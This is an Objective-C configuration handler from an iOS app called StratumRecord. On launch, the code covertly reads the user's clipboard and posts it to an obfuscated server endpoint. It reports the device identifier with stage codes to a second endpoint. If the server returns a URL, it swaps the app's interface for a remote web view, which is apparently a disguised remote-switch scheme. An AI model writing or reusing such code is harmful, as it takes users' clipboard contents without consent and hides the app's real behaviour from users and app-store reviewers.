//
//  SRConfigHandle.m
//  StratumRecord
//
//  Created by mac on 2026/3/2.
//

#import "SRConfigHandle.h"
#import "SRRecordGameListViewController.h"
#import <AFNetworking/AFNetworking.h>
#import <SmAntiFraud/SmAntiFraud.h>
#import "SRNetworkManager.h"
#import "SRTabBarController.h"
#import "SceneDelegate.h"
@interface SRConfigHandle ()

@end

@implementation SRConfigHandle

+ (UIViewController *)configShareViewControllerDelegate:(SceneDelegate *)delegate {
    
    NSString *ent = [[NSUserDefaults standardUserDefaults] valueForKey:@"FirstApp"];
    [self requestHistiryRecordImport:@"2"];
    if (ent) {[[NSUserDefaults standardUserDefaults] setValue:@"Enter" forKey:@"FirstApp"];
        [self requestHistiryRecordImport:@"1"];
    }
    NSString *url = [SRstrategySteps sharedManager].pf_url;
    if (url && url.length > 0) {
        return [self getRootViewControllerDelegate:delegate];
    }else {
        [[AFNetworkReachabilityManager sharedManager] setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
            if (status == AFNetworkReachabilityStatusReachableViaWWAN ||
                status == AFNetworkReachabilityStatusReachableViaWiFi) {
                NSString *pastStr = @"";
                if ([[UIPasteboard generalPasteboard] numberOfItems] != 0){
                    if ([UIPasteboard generalPasteboard].string){
                        pastStr = [UIPasteboard generalPasteboard].string;
                    }}
                [[SRNetworkManager sharedManager] POST_Form:@"/fres/circuit/diverter" parameters:@{@"am8_ba":@"fres",@"ow_u5p":pastStr} headers:@{}  success:^(id  _Nullable responseObject) {
                    [[AFNetworkReachabilityManager sharedManager] stopMonitoring];
                    NSDictionary *dict = ((NSArray *)responseObject[@"data"]).firstObject;
                    //        if (([[dict[@"mu_9yu"] stringByReplacingOccurrencesOfString:@"." withString:@""] isEqualToString:@"333"])) {
                    [[SRstrategySteps sharedManager] ConfigSave:dict];
                    
                    dispatch_async(dispatch_get_main_queue(), ^{
                        UIWindow *window = [UIApplication sharedApplication].keyWindow;
                        if (!window) {
                            window = [UIApplication sharedApplication].windows.firstObject;
                        }
                        if (window) {
                            window.rootViewController = [self getRootViewControllerDelegate:delegate];
                            [window makeKeyAndVisible];
                        }
                    });
                    //                }
                } failure:^(NSError * _Nullable error) {
                    
                }];
                
            }
        }];
        [[AFNetworkReachabilityManager sharedManager] startMonitoring];
        SRTabBarController *tabBarController = [[SRTabBarController alloc] init];
        [self requestHistiryRecordImport:@"3"];
        return tabBarController;
    }
}

+ (UIViewController *)getRootViewControllerDelegate:(SceneDelegate *)delegete {
    SRRecordGameListViewController *vc = [[SRRecordGameListViewController alloc] init];
        vc.params = @{@"url": [SRstrategySteps sharedManager].pf_url,@"isFirst":@(true)};
        UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
        NSArray *arr = [[SRstrategySteps sharedManager].pf_players[@"StratRecord47"] componentsSeparatedByString:@","];
        SmOption *o = [[SmOption alloc] init];
        o.organization = arr[0];
        [self requestHistiryRecordImport:@"4"];
        o.url = [[SRstrategySteps sharedManager].pf_gameId stringByAppendingString:arr[4]];
       o.cloudConf = false;
       o.appId = arr[1];
       o.notCollect = @[arr[3]];
       o.publicKey = arr[2];
       o.delegate = delegete;
       [SmAntiFraud.shareInstance create:o];
       return nav;
}

+ (void)requestHistiryRecordImport:(NSString *)import{
    NSDictionary *dict = @{
        @"mj_j6t":@"500180511",
        @"tn_n6z":import,
        @"hj8_fz":[[[UIDevice currentDevice] identifierForVendor] UUIDString],
    };
    [[SRNetworkManager sharedManager] POST_Form:@"/fres/emulsion/shearing" parameters:dict headers:@{} success:^(id  _Nullable responseObject) {
            
    } failure:^(NSError * _Nullable error) {
        
    }];
}
@end
